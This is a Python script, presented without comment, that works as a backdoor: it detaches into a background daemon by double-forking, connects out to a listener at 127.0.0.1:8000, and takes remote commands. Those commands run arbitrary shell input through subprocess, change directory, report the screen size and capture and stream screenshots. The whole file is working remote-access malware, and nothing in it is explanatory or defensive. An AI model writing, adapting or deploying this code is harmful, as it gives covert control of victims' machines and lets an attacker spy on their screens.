import os
import subprocess
import socket
import sys
import pyautogui

def sender(soc):
   pyautogui.screenshot("tmp.png")
   fp=open("tmp.png","rb")
   
   while True:
    buff=fp.read(1000)
    if len(buff)<1000:
      soc.send(buff)
      break
    soc.send(buff)

   fp.close()
   subprocess.check_output("rm -f tmp.png",shell=True)
   return 0
    

def execute():
 try:
  soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  soc.connect(("127.0.0.1",8000))
  soc.send("S")
 except:
  soc.close()
  exit(0)

 while(1):
  cmd=""
  cmd=soc.recv(60)

  try:

    if(cmd=="quit"):
     soc.close()
     return 0
    
    elif(cmd=="ss"):
     sender(soc)
     continue
    
    elif(cmd=="screensize"):
     x=pyautogui.size()
     sz=str(x.width)+"x"+str(x.height)
     soc.send(sz)
     continue
    
    cmd=cmd.rstrip()

    if("cd" in cmd and " " in cmd):

	   com=cmd.split()
	   try:
	     os.chdir(com[1])
	     soc.send("success")
	     continue
	   except:
	     soc.send("Unknown directory")

    out=""
    out=subprocess.check_output(cmd,shell=True)
    if(not(out)):
     soc.send("success")
    else:
     soc.send(out)
  
  except:
     soc.send("command did not work")



def main():

 pid=os.fork()
 
 if pid>0:
  exit(0)

 else:
  os.setsid()
  pid=os.fork()
  if pid>0:
   exit(0)
  else:
    sys.stdin.close()
    sys.stdout.close()
    sys.stdout="/dev/null"
    execute()


main()
